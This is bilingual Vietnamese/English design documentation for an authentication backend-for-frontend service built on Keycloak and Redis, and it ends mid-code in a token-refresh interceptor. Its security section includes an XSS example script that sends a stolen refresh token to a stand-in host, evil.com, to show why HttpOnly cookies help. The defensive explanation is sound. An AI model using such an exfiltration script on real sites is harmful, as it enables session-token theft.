# Auth-Service - Authentication BFF Documentation

## Mục lục

1. [Tổng quan](#1-tổng-quan)
2. [Kiến trúc](#2-kiến-trúc)
3. [Trách nhiệm Service](#3-trách-nhiệm-service)
4. [API Endpoints](#4-api-endpoints)
5. [Authentication Flow](#5-authentication-flow)
6. [Session Management](#6-session-management)
7. [Security](#7-security)
8. [Configuration](#8-configuration)
9. [Deployment](#9-deployment)
10. [Integration với Keycloak](#10-integration-với-keycloak)
11. [Integration với Frontend](#11-integration-với-frontend)
12. [Monitoring & Logging](#12-monitoring--logging)

---

## 1. Tổng quan

### 1.1 Mục đích

```
┌─────────────────────────────────────────────────────────────────┐
│                       AUTH-SERVICE                               │
│                   (Backend for Frontend)                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Auth-Service là service trung gian giữa Frontend và Keycloak  │
│  Đóng vai trò OAuth2 Client wrapper cho Frontend               │
│                                                                 │
│  ✅ Frontend gọi simple API (login, logout, refresh)           │
│  ✅ Token được giữ ở server (Redis)                          │
│  ✅ HttpOnly cookie bảo mật                                   │
│  ✅ Session management tập trung                              │
│  ✅ Client secret không bao giờ expose                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Vị trí trong hệ thống

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              INTERNET                                        │
│                                   │                                         │
│                                   ▼                                         │
│                    ┌─────────────────────────┐                             │
│                    │       API Gateway        │                             │
│                    └───────────┬─────────────┘                             │
│                                │                                           │
│         ┌──────────────────────┼──────────────────────┐                   │
│         │                      │                      │                    │
│         ▼                      ▼                      ▼                    │
│  ┌─────────────┐       ┌─────────────┐       ┌─────────────┐           │
│  │    Auth-   │       │    IAM-     │       │   Resource  │           │
│  │  Service   │       │   Service   │       │   Services  │           │
│  │   (BFF)    │       │             │       │             │           │
│  └──────┬──────┘       └──────┬──────┘       └──────┬──────┘           │
│         │                     │                      │                    │
│         │   ┌─────────────────┼──────────────────────┘                   │
│         │   │                 │                                            │
│         ▼   ▼                 ▼                                            │
│  ┌─────────────────────────────────────────────────────────────────┐       │
│  │                         KEYCLOAK                                  │       │
│  │                   Authorization Server                            │       │
│  └─────────────────────────────────────────────────────────────────┘       │
│                                    │                                        │
│                                    ▼                                        │
│                         ┌─────────────────┐                                 │
│                         │      Redis       │                                 │
│                         │   (Sessions)    │                                 │
│                         └─────────────────┘                                 │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 1.3 So sánh: Có vs Không có Auth-Service

| Khía cạnh | Không có Auth-Service | Có Auth-Service |
|-----------|----------------------|-----------------|
| **OAuth2 Flow** | Frontend tự implement | Auth-Service handle |
| **Token Storage** | localStorage (XSS risk) | Redis server-side |
| **Client Secret** | Exposed trong JS | Chỉ ở server |
| **Code Frontend** | 100+ dòng | 20 dòng |
| **CSRF Protection** | Tự làm | Có sẵn |
| **Session Mgmt** | Phân tán | Tập trung Redis |
| **Security** | ⚠️ Nhiều rủi ro | ✅ Bảo mật |

---

## 2. Kiến trúc

### 2.1 Package Structure

```
com.enterprise.auth
├── AuthServiceApplication.java
│
├── config/
│   ├── AuthProperties.java          # Auth configuration
│   ├── KeycloakProperties.java      # Keycloak config
│   ├── RedisConfig.java             # Redis session
│   ├── SecurityConfig.java          # Spring Security
│   ├── WebClientConfig.java         # HTTP client
│   └── CorsFilter.java              # CORS handling
│
├── controller/
│   └── AuthController.java          # REST API endpoints
│
├── service/
│   ├── AuthService.java             # Business logic
│   ├── KeycloakTokenService.java    # Keycloak OAuth2 calls
│   └── SessionService.java          # Redis session management
│
├── dto/
│   ├── LoginRequest.java
│   ├── LoginResponse.java
│   ├── UserInfoResponse.java
│   ├── RefreshRequest.java
│   ├── LogoutRequest.java
│   ├── ApiResponse.java
│   └── ErrorResponse.java
│
├── model/
│   ├── Session.java                 # Session entity (Redis)
│   └── KeycloakTokenResponse.java   # Token response model
│
├── exception/
│   ├── AuthException.java
│   ├── InvalidCredentialsException.java
│   ├── SessionNotFoundException.java
│   ├── TokenExpiredException.java
│   ├── SessionLimitExceededException.java
│   └── GlobalExceptionHandler.java
│
└── filter/
    ├── CsrfTokenFilter.java
    └── RequestLoggingFilter.java
```

### 2.2 Component Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                        AUTH-SERVICE                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   ┌─────────────────────────────────────────────────────────────┐   │
│   │                    AuthController                            │   │
│   │   POST /auth/login, /auth/logout, /auth/refresh, /auth/me │   │
│   └─────────────────────────────────────────────────────────────┘   │
│                              │                                       │
│                              ▼                                       │
│   ┌─────────────────────────────────────────────────────────────┐   │
│   │                      AuthService                            │   │
│   │   - login(): authenticate & create session                  │   │
│   │   - refresh(): rotate tokens                               │   │
│   │   - logout(): revoke & invalidate                          │   │
│   │   - getUserInfo(): return user details                     │   │
│   └─────────────────────────────────────────────────────────────┘   │
│                    │                        │                        │
│                    ▼                        ▼                        │
│   ┌────────────────────────┐   ┌────────────────────────┐          │
│   │  KeycloakTokenService │   │    SessionService       │          │
│   │                        │   │                        │          │
│   │  - authenticate()      │   │  - createSession()     │          │
│   │  - refreshToken()      │   │  - getSession()       │          │
│   │  - revokeToken()       │   │  - updateSession()     │          │
│   │  - getUserInfo()       │   │  - invalidateSession() │          │
│   └───────────┬────────────┘   └───────────┬────────────┘          │
│               │                             │                       │
│               ▼                             ▼                       │
│   ┌─────────────────────┐     ┌─────────────────────┐             │
│   │      Keycloak       │     │       Redis         │             │
│   │   OAuth2 API        │     │    (Sessions)       │             │
│   │                     │     │                     │             │
│   │ /token              │     │ auth:sessions:{id} │             │
│   │ /userinfo           │     │ auth:user-sessions │             │
│   │ /logout             │     └─────────────────────┘             │
│   └─────────────────────┘                                        │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 3. Trách nhiệm Service

### 3.1 Auth-Service Đảm nhiệm

```
┌────────────────────────────────────────────────────────────────────┐
│                    AUTH-SERVICE TRÁCH NHIỆM                         │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  ✅ Login Orchestration                                            │
│     - Nhận credentials từ frontend                                │
│     - Gọi Keycloak OAuth2 endpoint                                │
│     - Validate tokens                                             │
│                                                                    │
│  ✅ Session Management                                             │
│     - Tạo session trong Redis                                     │
│     - Track active sessions per user                              │
│     - Enforce concurrent session limit                            │
│                                                                    │
│  ✅ Cookie Management                                              │
│     - Set HttpOnly, Secure, SameSite cookies                      │
│     - Handle session cookie lifecycle                             │
│                                                                    │
│  ✅ Token Exchange                                                 │
│     - OAuth2 authorization code exchange                          │
│     - Refresh token rotation                                      │
│     - Token revocation                                            │
│                                                                    │
│  ✅ User Info API                                                  │
│     - Return user profile từ session                              │
│     - List active sessions                                        │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

### 3.2 Auth-Service KHÔNG Đảm nhiệm

```
┌────────────────────────────────────────────────────────────────────┐
│                   AUTH-SERVICE KHÔNG LÀM                           │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  ❌ User Management                                                │
│     (IAM-Service đảm nhiệm)                                       │
│                                                                    │
│  ❌ Role/Permission Assignment                                    │
│     (IAM-Service + Keycloak Admin API)                            │
│                                                                    │
│  ❌ Business Authorization                                         │
│     (Resource Services đảm nhiệm)                                │
│                                                                    │
│  ❌ Direct Keycloak Admin Operations                              │
│     (Chỉ gọi /token, /userinfo, /logout)                         │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

---

## 4. API Endpoints

### 4.1 Authentication Endpoints

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `POST` | `/auth/login` | ❌ | Login với username/password |
| `POST` | `/auth/logout` | ✅ | Logout session hiện tại |
| `POST` | `/auth/logout-all` | ✅ | Logout tất cả sessions |
| `POST` | `/auth/refresh` | Cookie | Refresh access token |
| `GET` | `/auth/me` | ✅ | Get current user info |

### 4.2 Session Management Endpoints

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `GET` | `/auth/sessions` | ✅ | List all active sessions |
| `DELETE` | `/auth/sessions/{id}` | ✅ | Revoke specific session |
| `POST` | `/auth/introspect` | Cookie | Check session validity |

### 4.3 API Request/Response Examples

#### Login

```bash
# Request
POST /auth/login
Content-Type: application/json

{
  "username": "john.doe",
  "password": "Secret123!",
  "deviceId": "device-uuid",
  "deviceName": "Chrome on Windows"
}

# Response (200 OK)
{
  "success": true,
  "message": "Login successful",
  "data": {
    "accessToken": "eyJhbGciOiJSUzI1NiIs...",
    "tokenType": "Bearer",
    "expiresIn": 300,
    "sessionId": "session-uuid",
    "user": {
      "userId": "user-uuid",
      "username": "john.doe",
      "email": "john.doe@example.com"
    }
  }
}

# Cookie set: AUTH_SESSION_ID=session-uuid; HttpOnly; Secure; SameSite=Strict
```

#### Refresh Token

```bash
# Request
POST /auth/refresh
Cookie: AUTH_SESSION_ID=session-uuid

# Response (200 OK) - Access token mới được trả về
{
  "success": true,
  "message": "Token refreshed",
  "data": {
    "accessToken": "eyJhbGciOiJSUzI1NiIs...",
    "tokenType": "Bearer",
    "expiresIn": 300,
    "sessionId": "session-uuid"
  }
}
```

#### Get User Info

```bash
# Request
GET /auth/me
Cookie: AUTH_SESSION_ID=session-uuid

# Response (200 OK)
{
  "success": true,
  "data": {
    "userId": "user-uuid",
    "username": "john.doe",
    "email": "john.doe@example.com",
    "sessionId": "session-uuid",
    "expiresAt": 1716200000000,
    "roles": ["USER", "DOC_VIEWER"]
  }
}
```

#### Logout

```bash
# Request
POST /auth/logout
Cookie: AUTH_SESSION_ID=session-uuid

# Response (200 OK)
{
  "success": true,
  "message": "Logout successful"
}
# Cookie bị clear
```

#### Get Active Sessions

```bash
# Request
GET /auth/sessions
Cookie: AUTH_SESSION_ID=session-uuid

# Response (200 OK)
{
  "success": true,
  "data": [
    {
      "sessionId": "session-uuid-1",
      "deviceId": "device-1",
      "deviceName": "Chrome on Windows",
      "userAgent": "Mozilla/5.0...",
      "ipAddress": "192.168.1.100",
      "createdAt": "2026-05-20T10:00:00Z",
      "lastAccessedAt": "2026-05-20T12:00:00Z",
      "expiresAt": 1716200000000
    },
    {
      "sessionId": "session-uuid-2",
      "deviceId": "device-2",
      "deviceName": "Safari on iPhone",
      "userAgent": "Mozilla/5.0...",
      "ipAddress": "192.168.1.101",
      "createdAt": "2026-05-20T08:00:00Z",
      "lastAccessedAt": "2026-05-20T11:30:00Z",
      "expiresAt": 1716200000000
    }
  ]
}
```

---

## 5. Authentication Flow

### 5.1 Login Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              LOGIN FLOW                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Browser          Auth-Service         Keycloak        Redis                │
│   ───────          ───────────         ────────        ──────                │
│       │                │                   │                │                 │
│       │  1. POST /auth/login           │                │                 │
│       │  {username, password}          │                │                 │
│       │───────────────▶│                   │                │                 │
│       │                │                   │                │                 │
│       │                │  2. POST /token  │                │                 │
│       │                │  grant_type=password               │                 │
│       │                │  client_id, client_secret          │                 │
│       │                │  username, password               │                 │
│       │                │──────────────────▶│                │                 │
│       │                │                   │                │                 │
│       │                │  3. Tokens (access, refresh, id) │                 │
│       │                │◀──────────────────│                │                 │
│       │                │                   │                │                 │
│       │                │  4. Create session               │                 │
│       │                │                   │                │                 │
│       │                │  sessionId = UUID                │                 │
│       │                │  Store: {                            │                 │
│       │                │    userId,                          │                 │
│       │                │    accessToken,                    │                 │
│       │                │    refreshToken,                   │                 │
│       │                │    expiresAt                       │                 │
│       │                │  }                                │                 │
│       │                │─────────────────────▶│                │                 │
│       │                │                   │                │                 │
│       │                │  5. Set HttpOnly Cookie          │                 │
│       │  Set-Cookie: AUTH_SESSION_ID=xxx   │                │                 │
│       │◀──────────────│                   │                │                 │
│       │                │                   │                │                 │
│       │  6. Response + access token       │                │                 │
│       │◀──────────────│                   │                │                 │
│       │                │                   │                │                 │
│       │  END - Logged in                  │                │                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 5.2 Token Refresh Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          TOKEN REFRESH FLOW                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Browser          Auth-Service         Keycloak        Redis                │
│   ───────          ───────────         ────────        ──────                │
│       │                │                   │                │                 │
│       │  1. API Request + Bearer Token   │                │                 │
│       │───────────────▶│                   │                │                 │
│       │                │                   │                │                 │
│       │                │  2. Token expired? 401             │                 │
│       │◀──────────────│                   │                │                 │
│       │                │                   │                │                 │
│       │  3. GET /auth/refresh            │                │                 │
│       │  Cookie: AUTH_SESSION_ID=xxx     │                │                 │
│       │───────────────▶│                   │                │                 │
│       │                │                   │                │                 │
│       │                │  4. Get session from Redis      │                 │
│       │                │◀─────────────────────│                │                 │
│       │                │                   │                │                 │
│       │                │  5. POST /token  │                │                 │
│       │                │  grant_type=refresh_token         │                 │
│       │                │  refresh_token=xxx               │                 │
│       │                │──────────────────▶│                │                 │
│       │                │                   │                │                 │
│       │                │  6. New tokens   │                │                 │
│       │                │◀──────────────────│                │                 │
│       │                │                   │                │                 │
│       │                │  7. Update session              │                 │
│       │                │  newAccessToken, newRefreshToken │                 │
│       │                │─────────────────────▶│                │                 │
│       │                │                   │                │                 │
│       │  8. New access token              │                │                 │
│       │◀──────────────│                   │                │                 │
│       │                │                   │                │                 │
│       │  9. Retry original request       │                │                 │
│       │───────────────▶│                   │                │                 │
│       │                │                   │                │                 │
│       │  10. Response  │                   │                │                 │
│       │◀──────────────│                   │                │                 │
│       │                │                   │                │                 │
│       │  END - Request completed         │                │                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 5.3 Logout Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            LOGOUT FLOW                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Browser          Auth-Service         Keycloak        Redis                │
│   ───────          ───────────         ────────        ──────                │
│       │                │                   │                │                 │
│       │  1. POST /auth/logout           │                │                 │
│       │  Cookie: AUTH_SESSION_ID=xxx     │                │                 │
│       │───────────────▶│                   │                │                 │
│       │                │                   │                │                 │
│       │                │  2. Get session   │                │                 │
│       │                │◀─────────────────────│                │                 │
│       │                │                   │                │                 │
│       │                │  3. Revoke refresh token         │                 │
│       │                │  POST /token/revoke              │                 │
│       │                │──────────────────▶│                │                 │
│       │                │                   │                │                 │
│       │                │  4. Success     │                │                 │
│       │                │◀──────────────────│                │                 │
│       │                │                   │                │                 │
│       │                │  5. Delete session              │                 │
│       │                │─────────────────────▶│                │                 │
│       │                │                   │                │                 │
│       │                │  6. Clear session cookie        │                 │
│       │  Set-Cookie: AUTH_SESSION_ID=; Max-Age=0       │                 │
│       │◀──────────────│                   │                │                 │
│       │                │                   │                │                 │
│       │  7. Response   │                   │                │                 │
│       │◀──────────────│                   │                │                 │
│       │                │                   │                │                 │
│       │  END - Logged out                │                │                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 6. Session Management

### 6.1 Session Data Model

```java
@RedisHash(value = "auth:sessions", timeToLive = 28800) // 8 hours
public class Session {
    
    @Id
    private String id;                    // UUID, primary key
    
    @Indexed
    private String userId;               // Keycloak user ID (sub)
    
    private String username;             // preferred_username
    private String email;                // email claim
    
    private String accessToken;          // Current access token
    private String refreshToken;         // Current refresh token
    private String idToken;              // ID token
    private String sessionState;         // Keycloak session state
    
    private Instant createdAt;           // Session creation time
    private Instant expiresAt;           // Access token expiration
    private Instant lastAccessedAt;       // Last activity
    
    private String deviceId;             // Device identifier
    private String deviceName;           // Device name
    private String userAgent;            // Browser user agent
    private String ipAddress;            // Client IP
    
    private List<String> roles;          // User roles from token
    private boolean active;              // Session active flag
}
```

### 6.2 Redis Key Structure

```
┌─────────────────────────────────────────────────────────────────────┐
│                      REDIS KEY STRUCTURE                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Session by ID:                                                     │
│  ─────────────────                                                  │
│  Key:    auth:sessions:{sessionId}                                 │
│  Type:   Hash                                                        │
│  TTL:    28800 seconds (8 hours)                                    │
│  Example: auth:sessions:a1b2c3d4-...                                │
│                                                                     │
│  User Sessions Index:                                               │
│  ─────────────────────                                              │
│  Key:    auth:user-sessions:{userId}                                │
│  Type:   Set (contains session IDs)                                 │
│  TTL:    28800 seconds                                              │
│  Example: auth:user-sessions:user-uuid-123                          │
│                                                                     │
│  Operations:                                                        │
│  ───────────                                                        │
│  SADD    auth:user-sessions:{userId} {sessionId}   // Add session   │
│  SMEMBERS auth:user-sessions:{userId}             // List sessions  │
│  SREM    auth:user-sessions:{userId} {sessionId}  // Remove session │
│  GET     auth:sessions:{sessionId}               // Get session     │
│  DEL     auth:sessions:{sessionId}               // Delete session  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 6.3 Concurrent Session Management

```java
// Max concurrent sessions per user: 3 (configurable)
if (sessionService.hasMaxSessionsReached(userId)) {
    int current = sessionService.countUserSessions(userId);
    int max = authProperties.getSession().getMaxConcurrentSessions();
    throw new SessionLimitExceededException(userId, current, max);
}
```

---

## 7. Security

### 7.1 Cookie Security

```
┌─────────────────────────────────────────────────────────────────────┐
│                      COOKIE SECURITY CONFIG                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  AUTH_SESSION_ID Cookie:                                           │
│  ─────────────────────────────────                                 │
│                                                                     │
│  Name:        AUTH_SESSION_ID                                       │
│  HttpOnly:    TRUE     ← JavaScript không đọc được                 │
│  Secure:      TRUE     ← Chỉ gửi qua HTTPS                        │
│  SameSite:    Strict   ← Ngăn CSRF attack                          │
│  Path:        /        ← Áp dụng cho tất cả paths                 │
│  Max-Age:     604800   ← 7 days                                   │
│                                                                     │
│  Flags:                                                                │
│  ──────                                                                │
│  ✅ HttpOnly    → Ngăn XSS đọc cookie                              │
│  ✅ Secure      → Chỉ gửi qua encrypted channel                   │
│  ✅ SameSite    → Ngăn CSRF attack                                 │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 7.2 Security Features

| Feature | Implementation | Purpose |
|---------|---------------|---------|
| **HttpOnly Cookie** | `httpOnly=true` | Ngăn XSS đọc session ID |
| **Secure Cookie** | `secure=true` | Chỉ gửi qua HTTPS |
| **SameSite Cookie** | `sameSite=Strict` | Ngăn CSRF |
| **Session Rotation** | Mỗi login tạo session mới | Security |
| **Token Revocation** | Gọi Keycloak revoke endpoint | Immediate logout |
| **Concurrent Limit** | Max 3 sessions/user | Resource protection |
| **CSRF Token** | Filter generates token | Additional protection |

### 7.3 XSS Attack Protection

```
┌─────────────────────────────────────────────────────────────────────┐
│                     XSS ATTACK SCENARIO                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  WITHOUT Auth-Service (localStorage):                                │
│  ───────────────────────────────────────                            │
│                                                                     │
│  1. Attacker injects malicious script:                              │
│     <script>                                                        │
│       document.location = 'https://evil.com/?c=' +                  │
│         localStorage.getItem('refresh_token');                       │
│     </script>                                                       │
│                                                                     │
│  2. Victim visits site → Token stolen!                             │
│                                                                     │
│  WITH Auth-Service (HttpOnly cookie):                               │
│  ───────────────────────────────────────                            │
│                                                                     │
│  1. Attacker injects malicious script:                              │
│     <script>                                                        │
│       console.log(document.cookie);  // Không thấy HttpOnly!        │
│     </script>                                                       │
│                                                                     │
│  2. Result: AUTH_SESSION_ID=[REDACTED - HttpOnly]                   │
│     → Attacker cannot read the session ID!                         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 8. Configuration

### 8.1 Application Configuration

```yaml
# application.yml
server:
  port: 8081
  servlet:
    context-path: /auth

spring:
  application:
    name: auth-service
  
  data:
    redis:
      host: ${REDIS_HOST:localhost}
      port: ${REDIS_PORT:6379}
      password: ${REDIS_PASSWORD:}
      timeout: 5000ms

keycloak:
  server-url: ${KEYCLOAK_SERVER_URL:http://localhost:8080}
  realm: ${KEYCLOAK_REALM:enterprise}
  client-id: ${KEYCLOAK_CLIENT_ID:auth-service}
  client-secret: ${KEYCLOAK_CLIENT_SECRET:secret}

auth:
  session:
    timeout: 28800    # 8 hours
    max-concurrent-sessions: 3
  cookie:
    name: AUTH_SESSION_ID
    http-only: true
    secure: true
    same-site: Strict
    max-age: 604800  # 7 days
```

### 8.2 Environment Variables

```bash
# Required
KEYCLOAK_SERVER_URL=http://keycloak:8080
KEYCLOAK_REALM=enterprise
KEYCLOAK_CLIENT_ID=auth-service
KEYCLOAK_CLIENT_SECRET=your-secure-secret

# Optional
REDIS_HOST=redis
REDIS_PORT=6379
REDIS_PASSWORD=
COOKIE_SECURE=true
SERVER_PORT=8081
```

### 8.3 Keycloak Client Configuration

```
┌─────────────────────────────────────────────────────────────────────┐
│                   KEYCLOAK CLIENT SETUP                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Client ID: auth-service                                           │
│  ──────────────────────────────────                                 │
│                                                                     │
│  General Settings:                                                  │
│  ├─ Client ID: auth-service                                         │
│  ├─ Name: Auth Service (BFF)                                       │
│  ├─ Description: Authentication BFF for Frontend                   │
│  └─ Enabled: ON                                                     │
│                                                                     │
│  Access Settings:                                                   │
│  ├─ Client Protocol: openid-connect                                │
│  ├─ Access Type: confidential                                       │
│  ├─ Service Accounts Enabled: ON                                    │
│  └─ Direct Access Grants Enabled: ON                                 │
│                                                                     │
│  Capability Config:                                                 │
│  ├─ Standard Flow: OFF (không cần cho BFF)                         │
│  ├─ Direct Access Grants: ON (password grant)                       │
│  └─ Service Accounts: ON (client credentials)                      │
│                                                                     │
│  Security Settings:                                                 │
│  ├─ Client Authenticator: Client ID and Secret                     │
│  └─ Secret: [Generate secure secret]                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 9. Deployment

### 9.1 Docker

```dockerfile
# Dockerfile
FROM eclipse-temurin:17-jre-alpine

WORKDIR /app

# Install ca-certificates
RUN apk add --no-cache ca-certificates curl

# Copy JAR
COPY target/auth-service-1.0.0-SNAPSHOT.jar app.jar

# Non-root user
RUN addgroup -S spring && adduser -S spring -G spring
RUN chown -R spring:spring /app
USER spring:spring

EXPOSE 8081

HEALTHCHECK --interval=30s --timeout=10s --start-period=60s \
    CMD curl -f http://localhost:8081/actuator/health || exit 1

ENTRYPOINT ["java", "-jar", "app.jar"]
```

### 9.2 Docker Compose

```yaml
# docker-compose.yml
version: '3.8'

services:
  auth-service:
    build: .
    container_name: auth-service
    ports:
      - "8081:8081"
    environment:
      - KEYCLOAK_SERVER_URL=http://keycloak:8080
      - KEYCLOAK_REALM=enterprise
      - KEYCLOAK_CLIENT_ID=auth-service
      - KEYCLOAK_CLIENT_SECRET=${KEYCLOAK_CLIENT_SECRET}
      - REDIS_HOST=redis
      - REDIS_PORT=6379
      - COOKIE_SECURE=false  # true in production
    depends_on:
      - redis
      - keycloak
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8081/actuator/health"]
      interval: 30s
      timeout: 10s
      retries: 3
    networks:
      - iam-network

  redis:
    image: redis:7-alpine
    container_name: auth-redis
    ports:
      - "6379:6379"
    volumes:
      - redis-data:/data
    networks:
      - iam-network

  keycloak:
    image: quay.io/keycloak/keycloak:24.0
    container_name: keycloak
    ports:
      - "8080:8080"
    environment:
      - KEYCLOAK_ADMIN=admin
      - KEYCLOAK_ADMIN_PASSWORD=admin
    command: start-dev
    networks:
      - iam-network

networks:
  iam-network:
    driver: bridge

volumes:
  redis-data:
```

### 9.3 Kubernetes Deployment

```yaml
# auth-service-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: auth-service
  labels:
    app: auth-service
spec:
  replicas: 2
  selector:
    matchLabels:
      app: auth-service
  template:
    metadata:
      labels:
        app: auth-service
    spec:
      containers:
        - name: auth-service
          image: auth-service:latest
          ports:
            - containerPort: 8081
          env:
            - name: KEYCLOAK_SERVER_URL
              value: "http://keycloak:8080"
            - name: KEYCLOAK_REALM
              value: "enterprise"
            - name: KEYCLOAK_CLIENT_ID
              value: "auth-service"
            - name: KEYCLOAK_CLIENT_SECRET
              valueFrom:
                secretKeyRef:
                  name: keycloak-secret
                  key: client-secret
            - name: REDIS_HOST
              value: "redis"
          livenessProbe:
            httpGet:
              path: /actuator/health
              port: 8081
            initialDelaySeconds: 60
            periodSeconds: 30
          readinessProbe:
            httpGet:
              path: /actuator/health
              port: 8081
            initialDelaySeconds: 30
            periodSeconds: 10
```

---

## 10. Integration với Keycloak

### 10.1 Keycloak API Calls

```java
@Service
public class KeycloakTokenService {
    
    // Login - Resource Owner Password Credentials
    public KeycloakTokenResponse authenticate(String username, String password) {
        MultiValueMap<String, String> formData = new LinkedMultiValueMap<>();
        formData.add("grant_type", "password");
        formData.add("client_id", keycloakProperties.getClientId());
        formData.add("client_secret", keycloakProperties.getClientSecret());
        formData.add("username", username);
        formData.add("password", password);
        
        return callTokenEndpoint(formData);
    }
    
    // Refresh Token
    public KeycloakTokenResponse refreshToken(String refreshToken) {
        MultiValueMap<String, String> formData = new LinkedMultiValueMap<>();
        formData.add("grant_type", "refresh_token");
        formData.add("client_id", keycloakProperties.getClientId());
        formData.add("client_secret", keycloakProperties.getClientSecret());
        formData.add("refresh_token", refreshToken);
        
        return callTokenEndpoint(formData);
    }
    
    // Revoke Token
    public boolean revokeToken(String token) {
        MultiValueMap<String, String> formData = new LinkedMultiValueMap<>();
        formData.add("client_id", keycloakProperties.getClientId());
        formData.add("client_secret", keycloakProperties.getClientSecret());
        formData.add("token", token);
        
        webClient.post()
            .uri(keycloakProperties.getRevokeEndpoint())
            .bodyValue(formData)
            .retrieve()
            .bodyToMono(String.class)
            .block();
        
        return true;
    }
    
    // Get User Info
    public Map<String, Object> getUserInfo(String accessToken) {
        return webClient.get()
            .uri(keycloakProperties.getUserinfoEndpoint())
            .header("Authorization", "Bearer " + accessToken)
            .retrieve()
            .bodyToMono(Map.class)
            .block();
    }
}
```

### 10.2 Keycloak Endpoints Used

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/realms/{realm}/protocol/openid-connect/token` | POST | Token issuance, refresh |
| `/realms/{realm}/protocol/openid-connect/userinfo` | GET | Get user profile |
| `/realms/{realm}/protocol/openid-connect/logout` | POST | Logout |

### 10.3 Token Validation

```java
// Auth-Service KHÔNG validate JWT trực tiếp
// Thay vào đó:
// 1. Session được lưu trong Redis sau khi login thành công
// 2. Session ID được trả về qua HttpOnly cookie
// 3. Khi có request, Resource Services validate JWT bằng Keycloak JWKS

// Resource Service validate JWT (via common-lib):
// 1. Extract JWT from Authorization header
// 2. Get JWKS from Keycloak: /realms/{realm}/protocol/openid-connect/certs
// 3. Validate signature, expiration, audience
// 4. Extract roles from token claims
```

---

## 11. Integration với Frontend

### 11.1 Frontend Integration

```javascript
// auth.js - Auth Manager for Frontend

class AuthManager {
    constructor(authServiceUrl = '/auth') {
        this.authServiceUrl = authServiceUrl;
    }
    
    async login(username, password) {
        const response = await fetch(`${this.authServiceUrl}/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: 'include', // IMPORTANT: Include cookies
            body: JSON.stringify({ username, password })
        });
        
        if (!response.ok) {
            throw new Error('Login failed');
        }
        
        const result = await response.json();
        return result.data;
    }
    
    async logout() {
        await fetch(`${this.authServiceUrl}/logout`, {
            method: 'POST',
            credentials: 'include'
        });
    }
    
    async getUserInfo() {
        const response = await fetch(`${this.authServiceUrl}/me`, {
            credentials: 'include'
        });
        
        if (!response.ok) {
            throw new Error('Not authenticated');
        }
        
        const result = await response.json();
        return result.data;
    }
    
    async callApi(url, options = {}) {
        // Automatically includes session cookie
        return fetch(url, {
            ...options,
            credentials: 'include' // IMPORTANT: Include cookies
        });
    }
    
    async refreshToken() {
        const response = await fetch(`${this.authServiceUrl}/refresh`, {
            method: 'POST',
            credentials: 'include'
        });
        
        if (!response.ok) {
            throw new Error('Refresh failed');
        }
        
        const result = await response.json();
        return result.data;
    }
}

// Usage
const auth = new AuthManager('http://localhost:8081/auth');

// Login
await auth.login('john.doe', 'password');

// Call protected API
const data = await auth.callApi('http://localhost:8080/api/data');

// Logout
await auth.logout();
```

### 11.2 React Integration

```jsx
// AuthContext.jsx
import React, { createContext, useContext, useState, useEffect } from 'react';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
    const [user, setUser] = useState(null);
    const [loading, setLoading] = useState(true);
    
    useEffect(() => {
        checkAuth();
    }, []);
    
    const login = async (username, password) => {
        const response = await fetch('/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({ username, password })
        });
        
        if (response.ok) {
            const data = await response.json();
            setUser(data.data.user);
        }
        
        return response.ok;
    };
    
    const logout = async () => {
        await fetch('/auth/logout', {
            method: 'POST',
            credentials: 'include'
        });
        setUser(null);
    };
    
    const checkAuth = async () => {
        try {
            const response = await fetch('/auth/me', {
                credentials: 'include'
            });
            
            if (response.ok) {
                const data = await response.json();
                setUser(data.data);
            } else {
                setUser(null);
            }
        } catch {
            setUser(null);
        } finally {
            setLoading(false);
        }
    };
    
    return (
        <AuthContext.Provider value={{ user, login, logout, loading }}>
            {children}
        </AuthContext.Provider>
    );
}

export const useAuth = () => useContext(AuthContext);
```

### 11.3 Automatic Token Refresh

```javascript
// Token refresh interceptor

class TokenRefreshInterceptor {
    constructor(authManager, apiClient) {
        this.authManager = authManager;
        this.apiClient = apiClient;
        this.isRefreshing = false;
        this.refreshSubscribers = [];
    }
    
    async handleRequest(request) {
        try {
            const response = await this.apiClient(request);
            
            if (response.status === 401) {
                return this.handleUnauthorized(request);
            }
            
            return response;
        } catch (error) {
            throw error;
        }
    }
    
    async handleUnauthorized(originalRequest) {
        if (!this.isRefreshing) {
